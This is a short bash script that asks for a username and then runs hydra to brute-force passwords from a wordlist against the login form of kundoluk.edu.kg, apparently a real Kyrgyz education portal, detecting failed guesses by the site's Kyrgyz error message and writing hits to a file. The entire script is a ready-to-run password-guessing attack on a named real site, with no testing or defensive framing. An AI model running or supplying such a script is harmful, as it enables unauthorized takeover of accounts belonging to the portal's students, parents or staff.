#!/bin/bash
echo "Enter Your Login"
read login
sudo hydra -l $login -P pass.txt kundoluk.edu.kg https-post-form "/account/login:login=^USER^&password=^PASS^&language=ky&type=default:Ысымыңыз же сыр сөзүңүз туура эмес!" -vV -o file.txt
